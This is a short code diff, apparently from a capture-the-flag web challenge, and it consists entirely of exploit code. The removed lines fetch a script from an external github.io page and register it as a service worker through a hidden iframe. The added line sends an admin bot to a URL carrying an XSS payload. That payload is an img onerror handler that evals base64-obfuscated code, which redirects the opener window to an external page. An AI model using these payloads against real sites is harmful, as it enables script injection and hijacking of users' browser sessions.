@@ -1,20 +1,4 @@
 <script>
-  fetch("https://d1x0rhk5.github.io/web_test/sw.js")  
-    .then(response => response.text())
-    .then(script => {
-      const blob = new Blob([script], { type: "application/javascript" });
-      const url = URL.createObjectURL(blob);
-      
-      const iframe = document.createElement("iframe");
-      iframe.src = "http://localhost:8000/ind.html";
-      iframe.style.display = "none";
-      document.body.appendChild(iframe);
-      
-      iframe.onload = () => {
-        iframe.contentWindow.navigator.serviceWorker.register(url)
-          .then(() => console.log("✅ Service Worker 등록됨"))
-          .catch(err => console.error("❌ 등록 실패:", err));
-      };
-    });
-  </script>
+  window.location.href = `http://web:8080/bot?url=http://%22%22http://%3Cscript%3Evar ha = "c2V0SW50ZXJ2YWwoKCkgPT4geyB3aW5kb3cub3BlbmVyICYmIHdpbmRvdy5vcGVuZXIubG9jYXRpb24uaHJlZi5pbmNsdWRlcygnaW5kZXguaHRtbCcpICYmICh3aW5kb3cub3BlbmVyLmxvY2F0aW9uLmhyZWYgPSAnaHR0cHM6Ly9kMXgwcmhrNS5naXRodWIuaW8vd2ViX3Rlc3QvdGVzdDEuaHRtbCcpOyB9LCAxKTs=";var newWin = window.open('http://web:8080/bot?url=http://""http://<img src=x onerror="eval(atob(\''%2b ha%2b '\'));">');%3C/script%3E` 
+</script>
   
